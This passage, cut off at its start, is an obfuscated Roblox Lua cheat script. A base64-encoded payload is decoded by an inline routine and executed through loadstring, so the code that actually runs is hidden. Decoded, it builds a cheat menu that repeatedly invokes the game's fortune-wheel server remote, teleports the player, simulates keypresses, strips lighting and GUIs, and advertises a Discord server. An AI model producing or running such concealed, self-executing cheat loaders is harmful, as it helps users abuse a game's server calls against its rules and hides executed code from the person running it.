CiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5BdXRvU3BpbldoZWVsIGFuZCB3YWl0KDEpIGRvCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5vcGVuRm9ydHVuZVdoZWVsUmVtb3RlOkludm9rZVNlcnZlcigib3BlbkZvcnR1bmVXaGVlbCIsIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5mb3J0dW5lV2hlZWxDaGFuY2VzWyJGb3J0dW5lIFdoZWVsIl0pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQpCgpGYXJtaW5nVGFiOkFkZEJ1dHRvbigiSnVuZ2xlIFNxdWF0IixmdW5jdGlvbigpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNoYXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIFBsYXllci5DaGFyYWN0ZXJBZGRlZDp3YWl0KCkKICAgIGxvY2FsIGhycCA9IGNoYXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGhycC5DRnJhbWUgPSBDRnJhbWUubmV3KC04MzcxLjQzMzU5Mzc1LCA2Ljc5ODA2MzI3LCAyODU4Ljg4NTI1MzkwKQogICAgdGFzay53YWl0KDAuMikKICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KHRydWUsIEVudW0uS2V5Q29kZS5FLCBmYWxzZSwgZ2FtZSkKICAgIHRhc2sud2FpdCgwLjA1KQogICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQoZmFsc2UsIEVudW0uS2V5Q29kZS5FLCBmYWxzZSwgZ2FtZSkKZW5kKQoKRmFybWluZ1RhYjpBZGRCdXR0b24oIkFudGkgTGFnIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBwbGF5ZXJHdWkgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKQogICAgbG9jYWwgbGlnaHRpbmcgPSBnYW1lOkdldFNlcnZpY2UoIkxpZ2h0aW5nIikKCiAgICBmb3IgXywgZ3VpIGluIHBhaXJzKHBsYXllckd1aTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIGd1aTpJc0EoIlNjcmVlbkd1aSIpIHRoZW4KICAgICAgICAgICAgZ3VpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gZGFya2VuU2t5KCkKICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhsaWdodGluZzpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB2OklzQSgiU2t5IikgdGhlbgogICAgICAgICAgICAgICAgdjpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGRhcmtTa3kgPSBJbnN0YW5jZS5uZXcoIlNreSIpCiAgICAgICAgZGFya1NreS5OYW1lID0gIkRhcmtTa3kiCiAgICAgICAgZGFya1NreS5Ta3lib3hCayA9ICJyYnhhc3NldGlkOi8vMCIKICAgICAgICBkYXJrU2t5LlNreWJveERuID0gInJieGFzc2V0aWQ6Ly8wIgogICAgICAgIGRhcmtTa3kuU2t5Ym94RnQgPSAicmJ4YXNzZXRpZDovLzAiCiAgICAgICAgZGFya1NreS5Ta3lib3hMZiA9ICJyYnhhc3NldGlkOi8vMCIKICAgICAgICBkYXJrU2t5LlNreWJveFJ0ID0gInJieGFzc2V0aWQ6Ly8wIgogICAgICAgIGRhcmtTa3kuU2t5Ym94VXAgPSAicmJ4YXNzZXRpZDovLzAiCiAgICAgICAgZGFya1NreS5QYXJlbnQgPSBsaWdodGluZwoKICAgICAgICBsaWdodGluZy5CcmlnaHRuZXNzID0gMAogICAgICAgIGxpZ2h0aW5nLkNsb2NrVGltZSA9IDAKICAgICAgICBsaWdodGluZy5UaW1lT2ZEYXkgPSAiMDA6MDA6MDAiCiAgICAgICAgbGlnaHRpbmcuT3V0ZG9vckFtYmllbnQgPSBDb2xvcjMubmV3KDAsIDAsIDApCiAgICAgICAgbGlnaHRpbmcuQW1iaWVudCA9IENvbG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICBsaWdodGluZy5Gb2dDb2xvciA9IENvbG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICBsaWdodGluZy5Gb2dFbmQgPSAxMDAKCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIHRydWUgZG8KICAgICAgICAgICAgICAgIHdhaXQoNSkKICAgICAgICAgICAgICAgIGlmIG5vdCBsaWdodGluZzpGaW5kRmlyc3RDaGlsZCgiRGFya1NreSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBkYXJrU2t5OkNsb25lKCkuUGFyZW50ID0gbGlnaHRpbmcKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgbGlnaHRpbmcuQnJpZ2h0bmVzcyA9IDAKICAgICAgICAgICAgICAgIGxpZ2h0aW5nLkNsb2NrVGltZSA9IDAKICAgICAgICAgICAgICAgIGxpZ2h0aW5nLk91dGRvb3JBbWJpZW50ID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgICAgICAgICAgICAgbGlnaHRpbmcuQW1iaWVudCA9IENvbG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICAgICAgICAgIGxpZ2h0aW5nLkZvZ0NvbG9yID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgICAgICAgICAgICAgbGlnaHRpbmcuRm9nRW5kID0gMTAwCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIHJlbW92ZVBhcnRpY2xlRWZmZWN0cygpCiAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyh3b3Jrc3BhY2U6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgaWYgb2JqOklzQSgiUGFydGljbGVFbWl0dGVyIikgdGhlbgogICAgICAgICAgICAgICAgb2JqOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIHJlbW92ZUxpZ2h0U291cmNlcygpCiAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyh3b3Jrc3BhY2U6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgaWYgb2JqOklzQSgiUG9pbnRMaWdodCIpIG9yIG9iajpJc0EoIlNwb3RMaWdodCIpIG9yIG9iajpJc0EoIlN1cmZhY2VMaWdodCIpIHRoZW4KICAgICAgICAgICAgICAgIG9iajpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICByZW1vdmVQYXJ0aWNsZUVmZmVjdHMoKQogICAgcmVtb3ZlTGlnaHRTb3VyY2VzKCkKICAgIGRhcmtlblNreSgpCmVuZCkKCkZhcm1pbmdUYWI6QWRkQnV0dG9uKCJFcXVpcCBTd2lmdCBTYW11cmFpIiwgZnVuY3Rpb24oKQogICAgdW5lcXVpcFBldHMoKQogICAgZXF1aXBQZXRzQnlOYW1lKCJTd2lmdCBTYW11cmFpIikKZW5kKQoKbG9jYWwgaW5mb1RhYiA9IHdpbmRvdzpBZGRUYWIoIkluZm8iKQppbmZvVGFiOlNob3coKQppbmZvVGFiOkFkZExhYmVsKCJNYWRlIGJ5IEhlbm5lIOKZpe+4jyIpLlRleHRTaXplID0gMjAKaW5mb1RhYjpBZGRMYWJlbCgiZGlzY29yZC5nZy9zaWxlbmNldjEiKS5UZXh0U2l6ZSA9IDIwCmluZm9UYWI6QWRkQnV0dG9uKCJDb3B5IEludml0ZSIsIGZ1bmN0aW9uKCkKICAgIGxvY2FsIGxpbmsgPSAiaHR0cHM6Ly9kaXNjb3JkLmdnLzllRmY5M0tnOEQiCiAgICBpZiBzZXRjbGlwYm9hcmQgdGhlbgogICAgICAgIHNldGNsaXBib2FyZChsaW5rKQogICAgICAgIGdhbWUuU3RhcnRlckd1aTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJMaW5rIENvcGllZCEiOwogICAgICAgICAgICBUZXh0ID0gIllvdSBjYW4gY29udGludWUgdG8gRGlzY29yZCBub3cuIjsKICAgICAgICAgICAgRHVyYXRpb24gPSAzOwogICAgICAgIH0pCiAgICBlbHNlCiAgICAgICAgZ2FtZS5TdGFydGVyR3VpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIkVycm9yISI7CiAgICAgICAgICAgIFRleHQgPSAiTm90IFN1cHBvcnRlZC4iOwogICAgICAgICAgICBEdXJhdGlvbiA9IDM7CiAgICAgICAgfSkKICAgIGVuZAplbmQpCmluZm9UYWI6QWRkTGFiZWwoIiIpCmxvY2FsIHdMYWJlbCA9IGluZm9UYWI6QWRkTGFiZWwoIlZFUlNJT04vLzIuMC4wIikKd0xhYmVsLlRleHRTaXplID0gNDAKd0xhYmVsLkZvbnQgPSBFbnVtLkZvbnQuQXJjYWRlCg==" local __map={};(function() local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' for i=1,#chars do __map[string.sub(chars,i,i)]=i-1 end end)() local out={};local i=1;while i<=#__b do local c1=__map[string.sub(__b,i,i)];local c2=__map[string.sub(__b,i+1,i+1)];local c3=__map[string.sub(__b,i+2,i+2)];local c4=__map[string.sub(__b,i+3,i+3)];if not c1 then break end;c2=c2 or 0;c3=c3 or 0;c4=c4 or 0;local n=c1*262144+c2*4096+c3*64+c4;local b1=math.floor(n/65536)%256;local b2=math.floor(n/256)%256;local b3=n%256;out[#out+1]=string.char(b1);if string.sub(__b,i+2,i+2)~='=' then out[#out+1]=string.char(b2) end;if string.sub(__b,i+3,i+3)~='=' then out[#out+1]=string.char(b3) end;i=i+4 end;local decoded=table.concat(out) local ok,err=pcall(function() local loader=loadstring or load;local f=loader(decoded);if type(f)=='function'then f() end end) if not ok then pcall(function() print('Wrapper error: '..tostring(err)) end) end end)()
